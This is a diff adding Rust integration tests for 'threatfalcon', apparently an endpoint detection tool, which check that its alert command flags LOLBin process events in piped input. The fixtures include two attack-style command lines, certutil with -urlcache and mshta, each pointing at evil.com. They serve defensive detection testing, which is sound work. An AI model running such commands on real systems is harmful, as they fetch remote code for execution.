@@ -3470,3 +3470,124 @@ fn replay_stderr_shows_progress() {
     assert!(stderr.contains("Replaying 1 events"), "expected progress in stderr, got: {stderr}");
     assert!(stderr.contains("complete"), "expected completion in stderr, got: {stderr}");
 }
+
+// ---------------------------------------------------------------------------
+// Alert stdin tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn alert_stdin_detects_lolbin() {
+    let event = sample_process_create_key(
+        "aa000000-0000-0000-0000-000000000001",
+        200, 1,
+        "C:/Windows/System32/certutil.exe",
+        "certutil.exe -urlcache http://evil.com",
+        "2026-03-13T10:00:00Z",
+        "200:5000",
+    );
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", "-", "--json"])
+    .stdin(std::process::Stdio::piped())
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    // Write event to stdin then close pipe.
+    {
+        let stdin = child.stdin.as_mut().unwrap();
+        writeln!(stdin, "{event}").unwrap();
+    }
+    // Close stdin by dropping it.
+    child.stdin.take();
+
+    let output = child.wait_with_output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    assert!(stdout.contains("lolbin"), "expected lolbin alert, got: {stdout}");
+    let parsed: serde_json::Value = serde_json::from_str(stdout.lines().next().unwrap()).unwrap();
+    assert_eq!(parsed["rule"], "lolbin");
+}
+
+#[test]
+fn alert_stdin_exits_on_eof() {
+    // Alert in stdin mode should exit cleanly when pipe closes.
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", "-", "--json"])
+    .stdin(std::process::Stdio::piped())
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    // Close stdin immediately.
+    child.stdin.take();
+
+    let output = child.wait_with_output().unwrap();
+    assert!(output.status.success(), "alert should exit 0 on stdin EOF");
+}
+
+#[test]
+fn replay_pipe_to_alert_stdin() {
+    // End-to-end: replay --speed 0 | alert --input - --json
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create_key(
+            "ab000000-0000-0000-0000-000000000001",
+            300, 1,
+            "C:/Windows/System32/mshta.exe",
+            "mshta.exe http://evil.com",
+            "2026-03-13T10:00:00Z",
+            "300:6000",
+        ),
+        sample_detection_event(
+            "ab000000-0000-0000-0000-000000000002",
+            "TF-EVA-001",
+        ),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    // Spawn replay, pipe stdout to alert stdin.
+    let replay = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["replay", "--input", path.to_str().unwrap(), "--speed", "0"])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    let alert = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", "-", "--json"])
+    .stdin(replay.stdout.unwrap())
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    let output = alert.wait_with_output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    // Should detect at least one alert (LOLBin mshta.exe or TF-EVA-001).
+    assert!(
+        !stdout.is_empty(),
+        "expected alerts from replay|alert pipeline, got empty stdout",
+    );
+
+    // Verify output is valid JSONL.
+    for line in stdout.lines() {
+        let parsed: serde_json::Value = serde_json::from_str(line).unwrap();
+        assert!(parsed["alert_type"].is_string());
+    }
+}
